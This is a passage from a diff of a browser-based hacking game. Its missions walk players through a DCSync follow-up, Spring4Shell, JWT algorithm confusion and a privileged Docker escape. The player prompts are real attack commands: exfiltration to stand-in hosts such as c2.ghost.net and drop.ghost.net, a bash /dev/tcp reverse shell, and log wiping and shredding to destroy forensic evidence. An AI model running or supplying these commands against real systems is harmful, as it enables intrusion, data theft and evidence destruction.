+        notify('DCSync: all hashes obtained','ok');nextN();setTimeout(hls_exfil,900);
+      }});
+  },2000);
 }
 
-/* ── INIT ── */
-function initGame(){
-  showScreen('s-game');
-  renderNodes();
-  enableInput(false);
-  sceneIntro();
-  log('System initialized','log-ok');
-  log('Target: NovaCorp BLACKVAULT','log-m');
+function hls_exfil(){
+  setLoc('EXFIL + ANTI-FORENSICS');setPh('EXFIL');
+  tBlank();tHdr('// PHASE 4-5: EXFIL + SCORCHED EARTH');
+  tWarn('  >> SOC anomaly alert raised on Kerberos ticket volume. 4 minutes until isolation.');tBlank();
+  tNPC('HANDLER','MOVE. Extract classified contracts. Wipe every forensic artifact. You have 28 seconds.');tBlank();
+  startMG({title:'// EXFIL + ANTI-FORENSICS',phase:'EXFIL',
+    ctx:'The SOC flagged unusual Kerberos TGS requests. IR team will image HELIOS-DC01 within minutes. We must extract the file share, encrypt, exfil, then destroy evidence: event logs, prefetch, LNK files, AppCompat shims, MFT entries.',
+    inst:'Extract classified share, exfil, destroy all forensic artifacts. 28 seconds.',
+    prompts:['robocopy \\\\HELIOS-FILE01\\classified C:\\loot /E /COPYALL /NP /LOG:NUL','7z a -mhe=on -p"sp3ctr3!" exfil.7z C:\\loot\\* && sdelete -p 3 -s -q C:\\loot\\','powershell -nop -c "iwr https://c2.ghost.net/rx -Method POST -Body ([io.file]::ReadAllBytes(\'exfil.7z\'))"','wevtutil cl * && del /f /q C:\\Windows\\Prefetch\\* && del /f /q %temp%\\*','reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32" /f && wevtutil cl Security'],
+    limit:28,failMsg:'SOC isolated the network segment. IR arrived first.',
+    onDone:()=>{
+      tBlank();tOK('>> 12.4GB CLASSIFIED CONTRACTS EXFILTRATED. FORENSIC TRAIL DESTROYED.');
+      setIDS(8);setStat('s',98);setStat('op',97);
+      missionComplete('Helios Defense classified defense contracts secured. Domain credentials dumped. SOC found a clean system — event logs empty, prefetch cleared, no network artifacts. You were Spectre. You were nothing.');
+    }});
 }
 
-function showScreen(id){
-  document.querySelectorAll('.screen').forEach(s=>s.classList.add('hide'));
-  document.getElementById(id).classList.remove('hide');
+/* ═══════════════════════════════════════════
+   MISSION 4: OMEGA PROTOCOL (GHOST)
+   AI-adaptive IDS — 28 second sequences throughout
+   Spring4Shell CVE-2022-22965
+   JWT algorithm confusion (RS256 → HS256 with public key)
+   Docker --privileged container escape
+   SQL injection + dark pool API exfil
+   Total server purge
+═══════════════════════════════════════════ */
+
+RUNNERS.apx=function(){
+  setLoc('OMEGA PROTOCOL — INIT');setPh('RECON');
+  tHdr('// OP: OMEGA PROTOCOL — APEX FINANCIAL');
+  tSys('Target: Apex Financial | AI-adaptive IDS | $2.1T dark pool');tBlank();
+  tNPC('HANDLER','Their IDS is machine learning based. Signature cache updates every 30 seconds. Every sequence is 28 seconds. Move before it learns your patterns.');tBlank();
+  setTimeout(()=>{
+    tInfo('[ recon: apex-auth.internal | apex-core.internal ]');
+    tVuln('  Spring Boot 2.6.0 detected (HTTP headers) — CVE-2022-22965 Spring4Shell');
+    tScan('  JWT library: jose-jwt — RS256 tokens at /api/v3/');
+    tVuln('  JWKS endpoint exposed: /.well-known/jwks.json — public key downloadable');
+    tVuln('  JWT alg:none and alg:HS256 both accepted in testing (misconfigured)');
+    tScan('  apex-core running in Docker — /proc/1/environ shows container=docker');
+    tVuln('  Docker inspect: --privileged flag set — container escape via /dev/sda mount');tBlank();
+    setIntel('Spring4Shell','CVE-2022-22965','v');setIntel('JWT','alg confusion','v');setIntel('Docker','--privileged','v');
+    unlockTool('nmap');unlockTool('burp');unlockTool('msf');unlockTool('john');
+    tBlank();enableIn(true,'exploit --cve CVE-2022-22965 apex-auth.internal','exploit --cve');
+    clearC();onC('exploit',apx_spring);
+  },2200);
+};
+
+function apx_spring(){
+  enableIn(false);clearC();nextN();setLoc('SPRING4SHELL');setPh('ZERO-DAY');showCVE('CVE-2022-22965');
+  tBlank();tHdr('// CVE-2022-22965 SPRING4SHELL — CLASSLOADER RCE');
+  tInfo('Spring MVC DataBinder — ClassLoader.resources.context.parent.pipeline manipulation');
+  tInfo('Overwrites Tomcat log configuration → writes JSP webshell to webroot. No creds.');tBlank();
+  startMG({title:'// SPRING4SHELL',phase:'ZERO-DAY',
+    ctx:'Spring Framework 5.3.0-5.3.17 on JDK9+: HTTP request parameters bind to ClassLoader properties via DataBinder. Setting classLoader.resources.context.parent.pipeline.first.pattern overwrites Tomcat\'s log pattern and directory, writing a JSP webshell.',
+    inst:'Execute Spring4Shell. 28 seconds.',
+    prompts:['python3 spring4shell.py --url https://apex-auth.internal/login --check','curl -sk "https://apex-auth.internal/login" -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20%25%7Bc1%7Di%20%5Cn"','curl -sk "https://apex-auth.internal/webshell.jsp?c=id"','bash -c "bash -i >& /dev/tcp/10.10.14.1/9001 0>&1"'],
+    limit:28,failMsg:'Spring4Shell blocked — WAF or SecurityManager active.',
+    onDone:()=>{
+      tBlank();tOK('>> SPRING4SHELL RCE ON APEX-AUTH. SYSTEM context confirmed.');
+      setIDS(30);setStat('h',82);setIntel('Shell','apex-auth RCE','f');
+      notify('Spring4Shell: RCE confirmed','ok');nextN();setTimeout(apx_jwt,800);
+    }});
+}
+
+function apx_jwt(){
+  setLoc('JWT ALGORITHM CONFUSION');setPh('PIVOT');
+  tBlank();tHdr('// JWT ALGORITHM CONFUSION — RS256 → HS256');
+  tInfo('Server uses RS256 (RSA) but also accepts HS256 (HMAC).');
+  tInfo('Sign HS256 token using the SERVER\'S PUBLIC RSA KEY as HMAC secret.');
+  tInfo('The server\'s verification code: hmac_verify(token, public_key) → VALID.');tBlank();
+  tCode('Attack: download public key → sign HS256 JWT with it → server accepts as valid');tBlank();
+  startMG({title:'// JWT ALG CONFUSION ATTACK',phase:'PIVOT',
+    ctx:'If an RS256 JWT server accepts HS256 tokens, we can forge admin tokens. Download the public RSA key from JWKS, use it as the HMAC-SHA256 secret to sign a new JWT with admin:true. The server verifies HMAC with public_key == our signature. Auth bypass.',
+    inst:'Download JWKS, forge admin JWT via algorithm confusion. 28 seconds.',
+    prompts:['curl -sk https://apex-auth.internal/.well-known/jwks.json | python3 jwks_to_pem.py > pub.pem','python3 jwt_confusion.py --pubkey pub.pem --alg HS256 --payload \'{"sub":"admin","admin":true,"iat":1700000000}\'','curl -sk https://apex-core.internal/api/v3/accounts -H "Authorization: Bearer $(cat forged.jwt)" | python3 -m json.tool','curl -sk https://apex-core.internal/api/v3/ledger/summary -H "Authorization: Bearer $(cat forged.jwt)"'],
+    limit:28,failMsg:'JWT forgery failed — server enforces RS256 only.',
+    onDone:()=>{
+      tBlank();tOK('>> FORGED JWT ACCEPTED. DARK POOL API: ADMIN ACCESS.');
+      tLoot('  14 sovereign fund accounts visible. Total: $2.1T');
+      setIDS(50);setIntel('Dark Pool API','admin JWT forged','f');
+      notify('JWT alg confusion: admin access','ok');nextN();setTimeout(apx_docker,800);
+    }});
+}
+
+function apx_docker(){
+  setLoc('DOCKER CONTAINER ESCAPE');setPh('PRIV ESC');
+  tBlank();tHdr('// PRIVILEGED DOCKER CONTAINER ESCAPE');
+  tInfo('Container has --privileged flag. All host capabilities available.');
+  tInfo('fdisk -l shows host block devices. Mount /dev/sda1 → chroot → host root.');
+  tCode('Defender mitigation: remove --privileged, use seccomp/AppArmor profiles');tBlank();
+  startMG({title:'// DOCKER ESCAPE — /dev/sda MOUNT',phase:'DOCKER ESCAPE',
+    ctx:'A Docker container with --privileged receives all Linux capabilities including CAP_SYS_ADMIN which permits mounting block devices. /dev/sda1 is the host root filesystem. Mount it, chroot into it, we are now root on the HOST machine.',
+    inst:'Check capabilities, mount host filesystem, escape container. 28 seconds.',
+    prompts:['cat /proc/1/status | grep CapEff','capsh --decode=0000003fffffffff | grep sys_admin','fdisk -l | grep "^/dev/sd"','mkdir /mnt/host && mount /dev/sda1 /mnt/host && ls /mnt/host','chroot /mnt/host /bin/bash -c "id && hostname"'],
+    limit:28,failMsg:'Container escape blocked — AppArmor or SELinux profile active.',
+    onDone:()=>{
+      tBlank();tOK('>> CONTAINER ESCAPED. ROOT ON HOST apex-core-prod.');
+      tLoot('  uid=0(root) gid=0(root) on physical host');
+      setIDS(68);setStat('h',100);setIntel('Host Root','container escape','f');
+      notify('Docker escape: host root','ok');nextN();setTimeout(apx_final,800);
+    }});
+}
+
+function apx_final(){
+  setLoc('DARK POOL — FINAL EXTRACTION');setPh('OMEGA');
+  tBlank();tHdr('// OMEGA — FINAL SEQUENCE: DARK POOL EXFIL + TOTAL PURGE');
+  tWarn('  >> AI IDS TIER-2. PATTERN LOCK IN T-90 SECONDS. SUBNET ISOLATION IMMINENT.');tBlank();
+  tNPC('HANDLER','One shot. Extract the full transaction ledger. Then burn the servers to prevent forensic recovery. This is Omega. 28 seconds.');tBlank();
+  startMG({title:'// OMEGA FINAL SEQUENCE',phase:'PURGE',
+    ctx:'The AI IDS has escalated to tier-2 — subnet isolation will trigger in ~90 seconds. We have one window: pull the full dark pool ledger via our forged JWT, chunk and exfil, then trigger a complete server wipe. No forensic recovery possible.',
+    inst:'Extract dark pool data. Purge all servers. FINAL sequence. 28 seconds.',
+    prompts:['curl -sk -H "Authorization: Bearer $(cat forged.jwt)" "https://apex-core.internal/api/v3/ledger/export?format=json&all=true" -o ledger_full.json','gpg --batch --passphrase "0m3ga!" --symmetric ledger_full.json && shred -u ledger_full.json','split -b 40m ledger_full.json.gpg seg_ && ls seg_* | wc -l','for f in seg_*; do curl -sk --retry 3 -T "$f" "ftps://drop.ghost.net/omega/"; done','find / -name "*.log" -o -name "*.pcap" 2>/dev/null | xargs shred -vzu && kill -9 $(pgrep -f "auditd|splunk|filebeat") 2>/dev/null; halt -f'],
+    limit:28,failMsg:'IDS pattern lock triggered. Subnet isolated before exfil completed.',
+    onDone:()=>{
+      tBlank();tOK('>> $2.1T DARK POOL LEDGER: DELIVERED IN 23 SEGMENTS.');
+      tOK('>> APEX FINANCIAL SERVERS: POWERED DOWN. FORENSIC RECOVERY: IMPOSSIBLE.');
+      setIDS(2);setStat('s',100);setStat('op',100);
+      missionComplete('Apex Financial dark pool destroyed. $2.1 trillion in sovereign wealth fund transactions delivered to regulatory authorities in 14 jurisdictions. The AI never got a clean signature. The servers are permanently dark. You were always GHOST.');
+    }});
 }
 </script>
 </body>
